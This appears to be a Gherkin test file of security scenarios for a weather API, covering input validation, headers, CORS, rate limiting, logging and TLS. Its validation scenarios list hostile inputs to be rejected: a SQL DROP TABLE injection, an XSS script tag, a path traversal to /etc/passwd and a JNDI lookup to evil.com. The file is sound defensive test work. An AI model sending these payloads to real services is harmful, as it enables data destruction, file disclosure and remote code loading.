Feature: Security
  As a service operator
  I want comprehensive security controls
  So that the service is protected against common attacks and vulnerabilities

  Background:
    Given the weather service is running
    And security features are enabled

  # Input Validation
  Scenario: SQL injection prevention in coordinates
    When I request weather with latitude "40.7128; DROP TABLE audit_logs;" and longitude "-74.0060"
    Then I should receive a 400 status code
    And the error message should contain "invalid latitude"
    And no database tables should be affected

  Scenario: XSS prevention in parameters
    When I request weather with latitude "<script>alert('xss')</script>" and longitude "-74.0060"
    Then I should receive a 400 status code
    And the response should not contain unescaped script tags
    And the Content-Type header should be "application/json"

  Scenario: Parameter type validation
    When I request weather with parameters:
      | parameter | value                            | expected_error           |
      | lat       | ../../../etc/passwd             | invalid latitude format  |
      | lon       | ${jndi:ldap://evil.com/a}      | invalid longitude format |
      | lat       | 9999999999999999999999999      | latitude out of range    |
      | lon       | -∞                              | invalid longitude format |
    Then all requests should receive 400 status codes
    And error messages should be safely escaped

  # Headers Security
  Scenario: Security headers are present
    When I make any request to the service
    Then the response should include security headers:
      | header                        | value                                      |
      | X-Content-Type-Options       | nosniff                                    |
      | X-Frame-Options              | DENY                                       |
      | X-XSS-Protection             | 1; mode=block                              |
      | Content-Security-Policy      | default-src 'none'; frame-ancestors 'none' |
      | Strict-Transport-Security    | max-age=31536000; includeSubDomains       |

  Scenario: CORS headers configuration
    Given CORS is configured for specific origins
    When I make a request with Origin header "https://trusted-domain.com"
    Then the response should include:
      | header                           | value                      |
      | Access-Control-Allow-Origin     | https://trusted-domain.com |
      | Access-Control-Allow-Methods    | GET, OPTIONS               |
      | Access-Control-Max-Age          | 86400                      |

  Scenario: Reject requests from unauthorized origins
    When I make a request with Origin header "https://evil-domain.com"
    Then the response should not include Access-Control-Allow-Origin header
    And CORS should block the request in browsers

  # Rate Limiting and DDoS Protection
  Scenario: Aggressive rate limiting for suspicious patterns
    When a single IP makes 100 requests in 1 second
    Then the IP should be temporarily blocked
    And subsequent requests should receive 429 status codes
    And the block should last for 5 minutes

  Scenario: Distributed rate limiting
    When requests come from 1000 different IPs in 1 second
    Then the global rate limit should apply
    And the service should remain responsive
    And legitimate traffic should not be affected

  # Authentication and Authorization (if enabled)
  Scenario: API key validation
    Given API key authentication is enabled
    When I make a request without an API key
    Then I should receive a 401 status code
    And the error message should be "API key required"

  Scenario: Invalid API key rejection
    Given API key authentication is enabled
    When I make a request with an invalid API key
    Then I should receive a 401 status code
    And the failed attempt should be logged
    And rate limiting should apply to failed auth attempts

  Scenario: API key in secure header
    Given API key authentication is enabled
    When I make a request with API key in X-API-Key header
    Then the request should be processed successfully
    And the API key should not appear in logs

  # Data Protection
  Scenario: Sensitive data is not logged
    When I make a request with sensitive headers:
      | header          | value            |
      | Authorization   | Bearer secret123 |
      | X-API-Key      | apikey456        |
    Then these values should not appear in:
      | location         |
      | application logs |
      | audit logs       |
      | error messages   |
      | trace attributes |

  Scenario: PII handling in logs
    When errors occur that might contain user information
    Then IP addresses should be partially masked in logs
    And user agents should be truncated if too long
    And geolocation data should be rounded

  # Error Handling
  Scenario: Generic error messages for security
    When various internal errors occur
    Then external error messages should be generic:
      | internal_error                  | external_message           |
      | database connection failed      | Internal server error      |
      | Redis authentication failed     | Internal server error      |
      | Invalid JWT signature          | Authentication failed      |
      | User not found in database    | Authentication failed      |

  Scenario: Stack traces are not exposed
    Given the service encounters an unexpected error
    When the error response is returned
    Then it should not contain:
      | sensitive_info      |
      | stack traces        |
      | file paths          |
      | internal IPs        |
      | service versions    |
      | framework details   |

  # TLS/SSL
  Scenario: TLS version enforcement
    Given the service requires TLS 1.2 or higher
    When a client attempts to connect with TLS 1.0
    Then the connection should be rejected
    And a security event should be logged

  Scenario: Strong cipher suites only
    When a TLS connection is established
    Then only strong cipher suites should be allowed:
      | cipher_suite                          |
      | TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 |
      | TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 |
      | TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305  |

  # Request Size Limits
  Scenario: Request size limits are enforced
    When I send a request with a 10MB body
    Then I should receive a 413 status code
    And the error message should be "Request entity too large"
    And the connection should be closed

  Scenario: Header size limits
    When I send a request with 100 headers
    Then I should receive a 431 status code
    And the error message should be "Request header fields too large"

  # Timeout Protection
  Scenario: Slow request timeout
    When a client sends data at 1 byte per second
    Then the connection should timeout after 30 seconds
    And the timeout should be logged as a security event

  Scenario: Slow response handling
    When the external service responds slowly
    Then the request should timeout after configured duration
    And partial responses should not be cached
    And the client should receive a 504 status code

  # Security Monitoring
  Scenario: Security events are logged
    When security-relevant events occur
    Then they should be logged with appropriate severity:
      | event                          | severity |
      | Failed authentication         | WARNING  |
      | Rate limit exceeded           | INFO     |
      | Malformed request            | WARNING  |
      | Potential SQL injection      | ERROR    |
      | TLS handshake failure        | WARNING  |

  Scenario: Audit trail for investigations
    When a security incident needs investigation
    Then the audit logs should provide:
      | information              |
      | request correlation IDs  |
      | timestamps with timezone |
      | source IP addresses      |
      | request paths and methods |
      | response status codes    |
      | error details            |